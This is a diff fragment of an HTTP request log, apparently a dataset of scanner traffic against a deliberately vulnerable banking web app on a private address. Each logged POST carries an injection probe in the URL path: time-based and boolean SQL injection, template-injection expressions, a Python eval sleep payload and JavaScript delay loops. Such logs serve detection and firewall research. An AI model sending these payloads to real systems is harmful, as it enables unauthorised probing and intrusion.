@@ -16913,3 +16913,733 @@ type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=
 END
 
 ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/(select*from(select(sleep(20)))a) HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1%2b(select*from(select(sleep(20)))a)%2b HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1%20and%20(select*from(select(sleep(20)))a)--%20 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1%20waitfor%20delay'0%3a0%3a20'-- HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1)waitfor%20delay'0%3a0%3a20'-- HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1%2c0)waitfor%20delay'0%3a0%3a20'-- HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/150470837%20or%201535%3d01535 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/189325721%20or%204844%3d4851 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/198355041%20or%207934%3d07934--%20 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/129916913%20or%208239%3d8241--%20 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1%20and%206596%3d06596 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1%20and%202288%3d2297 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1%20and%202139%3d02139--%20 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1%20and%205132%3d5136--%20 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/195100646'%20or%20'3006'%3d'3006 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/139580059'%20or%20'7228'%3d'7231 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/187196161'%20or%206666%3d6666--%20 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/135703212'%20or%209800%3d9806--%20 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1'%20and%20'4216'%3d'4216 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1'%20and%20'5094'%3d'5100 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1'%20and%207560%3d7560--%20 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1'%20and%203493%3d3499--%20 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1%22 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/rhqpm$%7b880*846%7dhewpa HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/vyzbt%7b%7b205*653%7d%7dqcxn5 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1%7d%7dsotzl'%2f%22%3cwzff3 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1%25%7deu35w'%2f%22%3cqoo15 HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1eeaqd%25%3epg2e2'%2f%22%3cigeng HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')) HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/(function()%7bif(typeof%20sfcu5%3d%3d%3d'undefined')%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bsfcu5%3d1%3b%7d%7d()) HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1'%2b(function()%7bif(typeof%20m5m7u%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bm5m7u%3d1%3b%7d%7d())%2b' HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
